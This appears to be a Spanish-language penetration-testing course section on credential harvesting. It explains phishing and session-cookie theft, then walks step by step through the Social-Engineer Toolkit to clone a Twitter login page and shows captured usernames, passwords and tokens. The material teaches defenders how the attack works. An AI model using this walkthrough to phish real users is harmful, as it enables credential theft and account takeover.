# 7.1.2 - Recolección de Credenciales
La recolección de credenciales no es un tipo de ataque nuevo, pero las metodologías utilizadas por los atacantes han evolucionado a lo largo de los años. La recolección de credenciales (o recolección de contraseñas) es el acto de recopilar y robar nombres de usuario válidos, contraseñas, tokens, PINs y cualquier otro tipo de credenciales mediante brechas de seguridad en la infraestructura. Una de las formas más comunes en que los atacantes realizan la recolección de credenciales es mediante el uso de correos electrónicos de suplantación de identidad (phishing) con enlaces que podrían redirigir a un usuario a un sitio falso. Este "sitio falso" podría verse como un servicio legítimo en la nube, como Gmail, Office 365 o incluso un sitio de medios sociales como X, LinkedIn, Instagram o Facebook. Por eso es tan importante utilizar la autenticación multifactor. Sin embargo, en algunos casos, los atacantes podrían eludir la autenticación multifactor al redirigir al usuario a un sitio malicioso y robar una cookie de sesión del navegador del usuario.<br>
Muchos servicios en la nube y aplicaciones alojadas en la nube usan el inicio de sesión único (SSO) y otros usan la autenticación federada. A veces, las aplicaciones basadas en la nube le permiten iniciar sesión con sus credenciales de Google, Apple o Facebook. Los atacantes podrían redirigir a los usuarios a sitios web suplantados que pueden parecer páginas de inicio de sesión legítimas de Google, Apple, Facebook o X. Desde allí, el atacante podría robar el nombre de usuario y la contraseña de la víctima. La imagen muestra un ejemplo de un ataque común de recolección de credenciales en el que el atacante envía a la víctima un correo electrónico de suplantación de identidad dirigido (spear phishing) que incluye un enlace a un sitio falso (en este ejemplo, un inicio de sesión de Twitter).<br>

**_Ataque de recolección de credenciales mediante correos electrónicos de Suplantación de Identidad Dirigida e Ingeniería Social_**<br>

<img src="<Módulo 6 - Vulnerabilidades Basadas en Aplicaciones/6.1 - Descripción General y Top 10 de OWASP/img/Imagenes/spear_phising.jpeg>" width="75%" height="75%" style="border-radius:10px;"><br>

En los siguientes ejemplos, verá lo fácil que es realizar un ataque de ingeniería social y crear una instancia de un sitio web falso (en este caso, un sitio de inicio de sesión de Twitter falso) para realizar un ataque de recolección de credenciales.<br>

__Paso 1.__ Inicie SET ingresando el comando `setoolkit`.<br>
__Paso 2.__ Seleccione `1) Social Engineering Attacks` en el menú principal.<br>

```bash
    Select from the menu:
        1) Social-Engineering Attacks
        2) Penetration Testing (Fast-Track)
        3) Third Party Modules
        4) Update the Social-Engineer Toolkit
        5) Update SET configuration
        6) Help, Credits, and About
        7)  Exit the Social-Engineer Toolkit
    set> 1
```

__Paso 3.__ En el menú, seleccione `2) Website Attack Vectors`.<br>

```bash
    Select from the menu:
        1) Spear-Phishing Attack Vectors
        2) Website Attack Vectors
        3) Infectious Media Generator
        4) Create a Payload and Listener
        5) Mass Mailer Attack
        6) Arduino-Based Attack Vector
        7) Wireless Access Point Attack Vector
        8) QRCode Generator Attack Vector
        9) Powershell Attack Vectors
       10) Third Party Modules
       99) Return back to the main menu.
    set> 2
```

__Paso 4.__ En el menú que aparece a continuación, seleccione `3) Credential Harvester Attack Method`.

```bash
        1) Java Applet Attack Method
        2) Metasploit Browser Exploit Method
        3) Credential Harvester Attack Method
        4) Tabnabbing Attack Method
        5) Web Jacking Attack Method
        6) Multi-Attack Web Method
        7) HTA Attack Method
       99) Return to Main Menu
    set:webattack> 3
```

En el siguiente menú, seleccione `1) Web Tewmplates` para usar una plantilla web predefinida (Twitter). Como puede ver, también tiene opciones para clonar un sitio web existente o importar un sitio web personalizado. En este ejemplo, se utiliza una plantilla web predefinida.<br>

```bash
        1) Web Templates
        2) Site Cloner
        3) Custom Import
       99) Return to Webattack Menu
    set:webattack> 1
```

__Paso 6.__ En el menú que se muestra, introduzca la dirección IP del host que desea utilizar para recolectar las credenciales del usuario (en este caso, __192.168.88.225__). En este ejemplo, SET ha reconocido la dirección IP del sistema atacante. Si esto sucede, puede presionar __Enter__ para seleccionar la dirección IP del sistema atacante.<br>

```bash
    [-] Credential harvester will allow you to utilize the clone
    capabilities within SET
    [-] to harvest credentials or parameters from a website as well as
    place them into a report
    -----------------------------------------------------------------------
    -- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS *
    IMPORTANT * --
    The way that this works is by cloning a site and looking for form
    fields to rewrite. If the POST fields are not usual methods for
    posting forms this could fail. If it does, you can always save the
    HTML, rewrite the forms to be standard forms and use the "IMPORT"
    feature. Additionally, really important:
    If you are using an EXTERNAL IP ADDRESS, you need to place the
    EXTERNAL IP address below, not your NAT address. Additionally, if
    you don't know basic networking concepts, and you have a private
    IP address, you will need to do port forwarding to your NAT IP
    address from your external IP address. A browser doesn't know how
    to communicate with a private IP address, so if you don't specify
    an external IP address if you are using this from an external
    perspective, it will not work. This isn't a SET issue this is how
    networking works.
    set:webattack> IP address for the POST back in Harvester/Tabnabbing
    [192.168.88.225]:
```

__Paso 7.__ Seleccione `3) Twitter`.<br>

```bash
    --------------------------------------------------------
                     **** Important Information ****
    For templates, when a POST is initiated to harvest
    credentials, you will need a site for it to redirect.
    You can configure this option under:
            /etc/setoolkit/set.config
    Edit this file, and change HARVESTER_REDIRECT and
    HARVESTER_URL to the sites you want to redirect to
    after it is posted. If you do not set these, then
    it will not redirect properly. This only goes for
    templates.
    --------------------------------------------------------
        1. Java Required
        2. Google
        3. Twitter
    set:webattack> Select a template: 3
    [*] Cloning the website: http://www.twitter.com
    [*] This could take a little bit...
    The best way to use this attack is if username and password form
    fields are available. Regardless, this captures all POSTs on a
    website.
    [*] The Social-Engineer Toolkit Credential Harvester Attack
    [*] Credential Harvester is running on port 80
    [*] Information will be displayed to you as it arrives below:
```

Luego puede redirigir a los usuarios a este sitio falso de Twitter enviando un spear phishing o aprovechando vulnerabilidades web, como las secuencias de comandos entre sitios (XSS) y la falsificación de solicitudes entre sitios (CSRF).<br>
El siguiente ejemplo muestra cómo el sistema atacante recolecta las credenciales de usuario. El nombre de usuario ingresado es _santosomar_ y la contraseña es _superbadpassword_. También puede ver el token de la sesión.<br>

```bash
    192.168.78.238 - - [28/Jun/2021 23:07:41] "GET / HTTP/1.1" 200 -
    [*] WE GOT A HIT! Printing the output:
    POSSIBLE USERNAME FIELD FOUND: session[username_or_email]=santosomar
    POSSIBLE PASSWORD FIELD FOUND: session[password]=superbadpassword
    PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52
    PARAM: scribe_log=
    POSSIBLE USERNAME FIELD FOUND: redirect_after_login=
    PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52
    [*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
    192.168.78.238 - - [28/Jun/2021 23:08:27] "POST /sessions HTTP/1.1"
    302 - 
```

Se sabe que los atacantes recolectan credenciales de proveedores de servicios en la nube una vez que ingresan a los sistemas de sus víctimas. Diferentes actores de amenazas han ampliado sus capacidades de recolección de credenciales para apuntar a múltiples servicios en la nube y fuera de la nube en las redes y sistemas internos de las víctimas después de la explotación de otras vulnerabilidades.<br>
